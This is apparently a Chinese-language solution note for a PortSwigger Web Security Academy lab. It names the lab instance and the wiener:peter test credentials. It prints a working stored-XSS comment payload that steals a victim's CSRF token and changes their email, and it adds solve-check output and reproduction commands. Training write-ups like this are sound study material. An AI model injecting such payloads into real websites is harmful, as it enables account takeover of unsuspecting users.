---
title: "lab-perform-csrf"
links:
  - target: xss-context-family
    relation: evidences
  - target: csrf-family
    relation: evidences
---

# lab-perform-csrf

> evidences: [[xss-context-family]], [[csrf-family]]

- 题面:Exploiting XSS to bypass CSRF defenses(/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
- 实例:https://0a2000270420c9d8810b0773004a0064.web-security-academy.net(`wiener:peter`)
- 判定目标:用评论里的 XSS 偷 victim 的 CSRF token,改掉 victim 邮箱;状态:**solved**(solved_check true)

## 关键步

1. 登录 wiener → `/my-account` 有 `change-email-form`:`POST /my-account/change-email`,`email` + `csrf`。
2. 评论(存储型 XSS,服务端渲染 → `<script>` 直接执行;该 lab **无 exploit server**)注入:
   `<script>fetch('/my-account').then(r=>r.text()).then(t=>{var m=t.match(/name="csrf" value="([^"]+)"/);return fetch('/my-account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+m[1]+'&email=hacker@evil-user.net'})})</script>`
3. victim 看评论即触发(其会话下同源请求) → victim 邮箱被改 → lab 翻。

## 证据摘录

```
# 落地检查(未编码的 <script> 在评论里)
text_grep '<script>' /tmp/b24-l2-check.html
 -> <p><script>fetch('/my-account')…</script></p>
solved_check "https://0a2000270420c9d8810b0773004a0064.web-security-academy.net/" --jar /tmp/b24-jar2.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 49E763496C6CDC049D3BC1855B2CF77F952D4F6C5793794E98EC2C06CA2FC193 --widget-source /web-security/cross-site-scripting/exploiting --jar /tmp/b24-jar2.json
# 登 wiener → 取 /post?postId=1 的 csrf → 投上面那条评论;等 victim(自动)
solved_check "<inst>/" --jar /tmp/b24-jar2.json
```
